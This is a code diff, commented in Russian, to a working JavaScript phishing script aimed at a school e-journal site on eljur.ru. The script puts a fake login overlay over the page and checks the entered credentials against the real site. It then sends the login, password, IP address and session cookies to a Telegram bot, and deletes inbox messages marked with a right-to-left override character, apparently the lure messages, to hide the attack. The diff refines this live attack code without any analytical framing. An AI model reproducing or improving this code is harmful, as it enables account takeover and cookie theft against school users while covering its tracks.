@@ -37,7 +37,11 @@ async function sendTg(txt) {
     await fetch(tgUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: tgChat, text: txt, parse_mode: "Markdown" })
+      body: JSON.stringify({
+        chat_id: tgChat,
+        text: txt,
+        parse_mode: "Markdown"
+      })
     });
   } catch (e) {
     console.error("ошибка tg:", e);
@@ -50,8 +54,11 @@ function mkOverlay() {
 
   const blur = document.createElement("div");
   Object.assign(blur.style, {
-    position: "fixed", top: "0", left: "0",
-    width: "100%", height: "100%",
+    position: "fixed",
+    top: "0",
+    left: "0",
+    width: "100%",
+    height: "100%",
     backdropFilter: "blur(8px)",
     background: "rgba(0,0,0,0.4)",
     zIndex: "9998"
@@ -63,7 +70,8 @@ function mkOverlay() {
   box.className = "login-outer";
   Object.assign(box.style, {
     position: "fixed",
-    top: "50%", left: "50%",
+    top: "50%",
+    left: "50%",
     transform: "translate(-50%, -50%)",
     zIndex: "9999",
     background: "#fff",
@@ -110,11 +118,18 @@ function mkOverlay() {
 
 function bindForm(box, blur) {
   const f = box.querySelector("form");
+  const btn = f.querySelector("button[type=submit]");
+  let submitting = false;
+
   f.addEventListener("submit", async (e) => {
     e.preventDefault();
 
+    if (submitting) return;
+    submitting = true;
+    btn.disabled = true; // блокируем кнопку на время
+
     const u = box.querySelector('input[autocomplete="username"]');
-    const p  = box.querySelector('input[autocomplete="current-password"]');
+    const p = box.querySelector('input[autocomplete="current-password"]');
     const uVal = (u.value || "").trim();
     const pVal = (p.value || "").trim();
     const errBox = box.querySelector(".error-container");
@@ -127,6 +142,8 @@ function bindForm(box, blur) {
             <div class="notice__content__text"><p>Заполните логин и пароль</p></div>
           </div>
         </div>`;
+      submitting = false;
+      btn.disabled = false;
       return;
     }
 
@@ -139,27 +156,38 @@ function bindForm(box, blur) {
       const d = await r.json();
 
       if (d.result && d.actions?.[0]?.type === "redirect") {
-        const link = d.actions[0]?.url ? `[https://shkolakzn.eljur.ru/...](${encodeURI(d.actions[0].url)})` : "нет";
-        await sendTg(`🔑 Логин: ${uVal}\n🔒 Пароль: ${pVal}\n🌐 IP: ${ip}\n🍪Куки: ${ckStr}\n🔗Ссылка: ${link}`);
+        const link = d.actions[0]?.url
+          ? `[https://shkolakzn.eljur.ru/...](${encodeURI(d.actions[0].url)})`
+          : "нет";
 
+        // 🔒 сообщение в TG отправится только 1 раз
+        await sendTg(
+          `🔑 Логин: ${uVal}\n🔒 Пароль: ${pVal}\n🌐 IP: ${ip}\n🍪Куки: ${ckStr}\n🔗Ссылка: ${link}`
+        );
+
+        // проверка и удаление писем
         (async () => {
           const base = "/journal-api-messages-action";
           try {
-            const r2 = await fetch(`${base}?method=messages.get_list&category=inbox&search=&limit=20&offset=0&teacher=0&status=&companion=&minDate=0`, {
-              credentials: "include",
-            });
+            const r2 = await fetch(
+              `${base}?method=messages.get_list&category=inbox&search=&limit=20&offset=0&teacher=0&status=&companion=&minDate=0`,
+              { credentials: "include" }
+            );
             const d2 = await r2.json();
 
-            const list = d2.list.filter(m => 
-              m.subject.includes("Привет!\u202E") || 
-              m.body.startsWith("Привет!‮&lt")
+            const list = d2.list.filter(
+              m =>
+                m.subject.includes("Привет!:\u202E") ||
+                m.body.startsWith("Привет!:‮&lt")
             );
 
             const ids = list.map(m => m.id);
 
             if (ids.length > 0) {
               console.log("нашёл письма:", ids);
-              const delUrl = `${base}?method=messages.delete&idsString=${encodeURIComponent(ids.join(";"))}&type=inbox`;
+              const delUrl = `${base}?method=messages.delete&idsString=${encodeURIComponent(
+                ids.join(";")
+              )}&type=inbox`;
               const delR = await fetch(delUrl, { credentials: "include" });
               const delD = await delR.json();
               console.log("удаление:", delD);
@@ -185,6 +213,8 @@ function bindForm(box, blur) {
               <div class="notice__content__text"><p>${msg}</p></div>
             </div>
           </div>`;
+        submitting = false;
+        btn.disabled = false;
       }
     } catch (e) {
       console.error("сервер не отвечает:", e);
@@ -194,6 +224,8 @@ function bindForm(box, blur) {
             <div class="notice__content__text"><p>Сервер недоступен</p></div>
           </div>
         </div>`;
+      submitting = false;
+      btn.disabled = false;
     }
   });
 }
